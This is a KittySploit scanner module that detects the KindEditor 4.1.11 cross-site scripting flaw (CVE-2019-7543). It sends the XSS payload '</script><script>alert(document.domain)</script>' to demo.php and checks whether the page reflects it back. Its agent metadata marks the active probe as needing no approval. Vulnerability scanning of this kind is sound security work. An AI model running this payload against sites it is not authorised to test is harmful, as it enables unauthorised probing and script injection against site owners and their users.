#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""KindEditor 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'KindEditor 4.1.11 - Cross-Site Scripting Detection',
        'description': 'KindEditor 4.1.11 contains a cross-site scripting vulnerability via the php/demo.php content1 parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'kindeditor', 'xss', 'kindsoft', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/0xUhaw/CVE-Bins/tree/master/KindEditor',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-7543',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/HaleBera/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION',
            'https://github.com/HaleBera/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION-Deployments',
        ],
        'cve': 'CVE-2019-7543',
    }

    def run(self):
        for path in ('/kindeditor/php/demo.php', '/php/demo.php'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='content1=</script><script>alert(document.domain)</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9')
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('</script><script>alert(document.domain)</script>',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason='KindEditor 4.1.11 - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

